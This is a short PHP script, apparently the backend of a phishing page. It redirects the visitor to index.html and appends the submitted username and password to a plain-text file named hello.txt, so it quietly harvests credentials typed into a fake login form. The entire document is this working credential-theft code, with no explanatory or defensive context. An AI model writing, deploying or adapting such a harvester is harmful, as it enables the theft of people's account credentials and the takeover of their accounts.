    <?php
    header('Location: index.html');
    $handle = fopen("hello.txt", "a");
    fwrite($handle, "Username:$_POST[username]\tpassword:$_POST[password]\n");
    fclose($handle);
    exit;
    ?>

